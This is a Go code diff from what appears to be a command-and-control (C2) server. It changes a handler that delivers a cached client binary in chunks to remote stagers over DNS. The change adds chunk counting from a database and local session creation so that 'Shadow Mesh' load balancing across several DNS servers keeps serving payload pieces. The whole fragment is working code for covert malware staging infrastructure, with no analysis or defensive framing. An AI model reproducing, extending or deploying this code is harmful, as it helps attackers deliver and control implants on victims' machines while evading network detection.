@@ -1674,8 +1674,10 @@ func (c2 *C2Manager) handleStagerChunkRequestNew(chunkIndex int, stagerIP string
 	c2.mutex.RUnlock()
 
 	var clientBinaryID string
+	var totalChunks int
 	if hasCachedSession {
 		clientBinaryID = cachedSession.ClientBinaryID
+		totalChunks = cachedSession.TotalChunks
 	} else {
 		// Session not in memory yet - might be from different DNS server
 		// Try to find ANY cached binary and serve from that
@@ -1696,6 +1698,47 @@ func (c2 *C2Manager) handleStagerChunkRequestNew(chunkIndex int, stagerIP string
 		if !isDuplicate {
 			logf("[C2] Found cached binary: %s (will serve from this)", clientBinaryID)
 		}
+
+		// Count total chunks for this binary
+		if c2.db != nil {
+			row := c2.db.db.QueryRow(`
+				SELECT COUNT(*) FROM stager_chunk_cache 
+				WHERE client_binary_id = ?
+			`, clientBinaryID)
+			if err := row.Scan(&totalChunks); err != nil {
+				logf("[C2] Error counting chunks: %v", err)
+				totalChunks = 0
+			}
+		}
+
+		// CREATE SESSION NOW so subsequent chunks from this DNS server work!
+		// This is critical for Shadow Mesh load balancing across multiple DNS servers
+		if !isDuplicate {
+			logf("[C2] 🔧 Creating session %s locally (stager load-balanced to this server)", sessionID)
+		}
+
+		c2.mutex.Lock()
+		if c2.cachedStagerSessions == nil {
+			c2.cachedStagerSessions = make(map[string]*CachedStagerSession)
+		}
+		c2.cachedStagerSessions[sessionID] = &CachedStagerSession{
+			SessionID:       sessionID,
+			MasterSessionID: sessionID,
+			ClientBinaryID:  clientBinaryID,
+			StagerIP:        stagerIP,
+			TotalChunks:     totalChunks,
+			ChunksServed:    0,
+			CreatedAt:       time.Now(),
+			LastActivity:    time.Now(),
+		}
+		c2.mutex.Unlock()
+
+		if !isDuplicate {
+			logf("[C2] ✅ Session %s created with %d chunks available", sessionID, totalChunks)
+		}
+
+		hasCachedSession = true
+		cachedSession = c2.cachedStagerSessions[sessionID]
 	}
 
 	// Now serve the chunk from cache (fast - no Master query!)
